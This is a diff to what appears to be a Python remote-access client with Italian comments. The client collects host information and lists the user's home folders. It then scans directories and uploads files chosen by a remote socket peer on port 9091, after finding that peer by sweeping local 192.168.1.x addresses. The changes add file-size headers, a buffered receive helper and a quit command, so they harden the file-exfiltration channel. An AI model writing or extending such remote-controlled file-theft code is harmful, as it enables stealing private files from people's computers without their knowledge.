@@ -58,10 +58,10 @@ import ipaddress
 from pathlib import Path
 import os
 # imported Libraries
-import ipinfo
+#import ipinfo
 import psutil
 from cpuinfo import get_cpu_info
-
+import ipinfo
 access_token = ''
 IpAddr = ""
 Port = 9091
@@ -135,9 +135,12 @@ def getTokenFromConnection():
 
 def fileRetrieval():
     paths = getPaths()
-    s.send(paths)
+    s.send(paths.encode())
     file_numbers = scanDir()
     s.send(file_numbers)
+    status = s.recv(1092).decode("utf-8")
+    if status == "quit":
+        return
     uploaderFunction()
 
 def main():
@@ -278,7 +281,7 @@ def GetGeneralInfo():
 
     return json.dumps(info, indent=4).encode("utf-8")
 
-def getPaths():
+"""def getPaths():
     print("sono entrato in getPaths")
     Relative_path = str(Path.home()) + '/.config/user-dirs.dirs'  #/home/$USER/.config/user-dirs.dirs
     print(Relative_path)  #secondo print
@@ -291,9 +294,9 @@ def getPaths():
                 path_dict[f"{count}) {x[1][:-1]}"] =  str(Path.home()) + "/" + x[1][:-1]
                 count += 1
 
-    return json.dumps(path_dict,indent=4).encode("utf-8")
+    return json.dumps(path_dict,indent=4).encode("utf-8")"""
 
-"""def getPaths2():
+def getPaths():
     home = Path.home()
     dictionary = {}
     count = 1
@@ -304,7 +307,7 @@ def getPaths():
                 count += 1
         break  # prevent descending into subfolders
 
-    return json.dumps(dictionary, indent=4).encode("utf-8")"""
+    return json.dumps(dictionary)
 
 def scanDir():
     input = s.recv(1092).decode()
@@ -320,12 +323,12 @@ def scanDir():
     return json.dumps(file_number).encode("utf-8")
 
 def uploaderFunction():
-   found_files = s.recv(8192).decode()
+   found_files = recvall(s).decode()
    found_files = json.loads(found_files)   #lista dei file trovati nel path scelto
 
    time.sleep(3)
 
-   files_by_number = s.recv(1092).decode()
+   files_by_number = s.recv(8192).decode()
    files_by_number = json.loads(files_by_number)    #lista dei file da scaricare
 
    amount_of_files = len(files_by_number)
@@ -335,12 +338,24 @@ def uploaderFunction():
    for i in files_by_number:
        file_to_open = str(found_files[i-1])
        with open(file_to_open, 'rb') as file_to_send:
+           file_info_struct = os.stat(file_to_open)
+           file_size = file_info_struct.st_size
+           s.send(str(file_size).encode("utf-8"))  # filesize
            s.send(file_to_open.encode("utf-8","ignore"))
            s.recv(100).decode("utf-8")
            file_data = file_to_send.read()
            s.sendall(file_data)
            s.recv(1092).decode("utf-8")
 
+def recvall(sock):
+    BUFF_SIZE = 4096
+    data = b''
+    while True:
+        part = sock.recv(BUFF_SIZE)
+        data += part
+        if len(part) < BUFF_SIZE:
+            break    # 0 bit da scaricare o end of file
+    return data
 
 def signal_handler(signal, frame):
     print("Keyboard Interrupt received: closing connection...")
@@ -401,7 +416,7 @@ def loop(lista):
 
 def splitter():
     numberlist = []
-    for i in range(175, 254):
+    for i in range(177, 180):
         numberlist.append(f"192.168.1.{i}")
     return numberlist
 
